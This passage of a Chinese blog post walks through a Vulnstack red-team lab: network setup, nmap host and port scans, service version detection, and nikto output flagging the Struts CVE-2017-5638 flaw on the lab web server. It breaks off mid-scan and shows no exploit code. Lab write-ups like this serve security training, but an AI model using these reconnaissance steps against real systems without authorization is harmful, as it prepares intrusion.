<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="ATT&amp;CK红队评估实战靶场(四)

 靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/6/
 

环境搭建

新建两张仅主机网卡，一张`192.168.183.0`网段（内网网卡），一张1`92.168.157.0`网段（模拟外网网段），然后按照拓补图分配网卡即可

/image50.png)

IP信息：

Kali `192.158.1..." data-next-head=""/><meta property="og:title" content="Vulnstack - ATT&amp;CK红队评估实战靶场(四)" data-next-head=""/><meta property="og:description" content="ATT&amp;CK红队评估实战靶场(四)

 靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/6/
 

环境搭建

新建两张仅主机网卡，一张`192.168.183.0`网段（内网网卡），一张1`92.168.157.0`网段（模拟外网网段），然后按照拓补图分配网卡即可

/image50.png)

IP信息：

Kali `192.158.1..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/04/Vulnstack红队评估实战靶场(四)" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-04" data-next-head=""/><meta property="article:modified_time" content="2025-04-04" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Vulnstack" data-next-head=""/><meta property="article:tag" content="Windows靶机" data-next-head=""/><meta property="article:tag" content="综合靶场" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Vulnstack - ATT&amp;CK红队评估实战靶场(四)" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/04/Vulnstack红队评估实战靶场(四)" data-next-head=""/><title data-next-head="">Vulnstack - ATT&amp;CK红队评估实战靶场(四)</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/853bc95fd1f6ef5e.css" as="style"/><link rel="stylesheet" href="/_next/static/css/853bc95fd1f6ef5e.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-93190d8919063c5b.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-7e7e07e4510ce4f6.js" defer=""></script><script src="/_next/static/NVqbYh_W7zwCLmslkTGaC/_buildManifest.js" defer=""></script><script src="/_next/static/NVqbYh_W7zwCLmslkTGaC/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700">Vulnstack - ATT&amp;CK红队评估实战靶场(四)</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-04-04</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-04-04<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Vulnstack</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Windows靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">综合靶场</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(四)","contentHtml":"\u003ch1\u003eATT\u0026#x26;CK红队评估实战靶场(四)\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e靶机链接：\u003ca href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\"\u003ehttp://vulnstack.qiyuanxuetang.net/vuln/detail/6/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e环境搭建\u003c/h2\u003e\n\u003cp\u003e新建两张仅主机网卡，一张\u003ccode\u003e192.168.183.0\u003c/code\u003e网段（内网网卡），一张1\u003ccode\u003e92.168.157.0\u003c/code\u003e网段（模拟外网网段），然后按照拓补图分配网卡即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image50.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003eIP信息：\u003c/p\u003e\n\u003cp\u003eKali \u003ccode\u003e192.158.157.129\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eUbuntu-web \u003ccode\u003e192.168.157.128\u003c/code\u003e \u003ccode\u003e192.168.183.129\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eWin7 \u003ccode\u003e192.168.183.131\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eDC \u003ccode\u003e192.168.183.130\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后在ubuntu启动Docker，启动 \u003ccode\u003esudo docker start ec 17 09 bb da 3d ab ad\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e主机探测端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e扫描网段内存活主机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00018\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:03 (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00024\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:B6:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:4A (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.254\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00021\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:E7:E8:3F (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up.\nNmap done: \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e IP addresses (\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e28.01\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e靶机IP是\u003ccode\u003e128\u003c/code\u003e ，\u003ccode\u003ekali\u003c/code\u003e 的IP是\u003ccode\u003e129\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描靶机端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:04 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00076\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65531\u003c/span\u003e closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  dc\n\u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  globe\n\u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  finger\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:B6:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:4A (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e2001\u003c/code\u003e-\u003ccode\u003e2003\u003c/code\u003e是\u003ccode\u003eweb\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00075\u003c/span\u003es latency).\n\nPORT     STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e6.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003ep1 Ubuntu 2ubuntu2\u003cspan class=\"hljs-number\"\u003e.13\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Jetty \u003cspan class=\"hljs-number\"\u003e9.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e.v20150529\n\u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache Tomcat \u003cspan class=\"hljs-number\"\u003e8.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.19\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.25\u003c/span\u003e ((Debian))\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:B6:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:4A (VMware)\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eJetty 9.2.11\u003c/code\u003e 以及\u003ccode\u003eTomcat\u003c/code\u003e 和 \u003ccode\u003ehttpd\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务漏洞，使用\u003ccode\u003enikto\u003c/code\u003e扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enikto -host \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e -port \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e                                                                                                                                 \n- Nikto v2\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e                                                                                                                                                                          \n---------------------------------------------------------------------------                                                                                                             \n---------------------------------------------------------------------------                                                                                                             \n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e                                                                                                                                                   \n+ Target Hostname:    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e                                                                                                                                                   \n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e                                                                                                                                                              \n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e (GMT8)                                                                                                                                        \n---------------------------------------------------------------------------                                                                                                             \n+ Server: Jetty(\u003cspan class=\"hljs-number\"\u003e9.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e.v20150529)                                                                                                                                                       \n+ /: Cookie JSESSIONID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies                                                                \n+ /: The anti-clickjacking X-Frame-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options                                        \n+ /: The X-Content-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e. This could allow the user agent to render the content of the site \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a different fashion to the MIME \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e. See: https://www.netsparke\nr.com/web-vulnerability-scanner/vulnerabilities/missing-content-\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e-header/                \n+ No CGI Directories found (use \u003cspan class=\"hljs-string\"\u003e'-C all'\u003c/span\u003e to force check \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e possible dirs)                                                                                                              \n+ Jetty/\u003cspan class=\"hljs-number\"\u003e9.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e.v20150529 appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least \u003cspan class=\"hljs-number\"\u003e11.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e). Jetty \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e AND \u003cspan class=\"hljs-number\"\u003e9.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e.v20210516 are also currently supported.                                           \n+ /: Uncommon header \u003cspan class=\"hljs-string\"\u003e'nikto-added-cve-2017-5638'\u003c/span\u003e found, \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e contents: \u003cspan class=\"hljs-number\"\u003e42.\u003c/span\u003e                                                                                                              \n+ /: Site appears vulnerable to the \u003cspan class=\"hljs-string\"\u003e'strutshock'\u003c/span\u003e vulnerability. See: http://cve.mitre.org/cgi-\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/cvename.cgi?name=CVE-\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5638\u003c/span\u003e\n+ /index.action: Site appears vulnerable to the \u003cspan class=\"hljs-string\"\u003e'strutshock'\u003c/span\u003e vulnerability. See: http://cve.mitre.org/cgi-\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/cvename.cgi?name=CVE-\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5638\u003c/span\u003e\n+ /login.action: Site appears vulnerable to the \u003cspan class=\"hljs-string\"\u003e'strutshock'\u003c/span\u003e vulnerability. See: http://cve.mitre.org/cgi-\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/cvename.cgi?name=CVE-\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5638\u003c/span\u003e                                            \n+ /getaccess: This may be an indication that the server \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e running getAccess \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SSO.                                                                                                   + /siteminder: This may be an indication that the server \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e running Siteminder \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SSO.                                                                                                 \n+ /tree: WASD Server reveals the entire web root structure \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e files via this URL. Upgrade to a later version \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e secure according to the documents on the WASD web site.               \n+ ERROR: Error limit (\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e) reached \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host, giving up. Last error:                                                                                                                      \n+ Scan terminated: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e error(s) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e item(s) reported on remote host                                                                                                                    \n+ End Time:           \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan 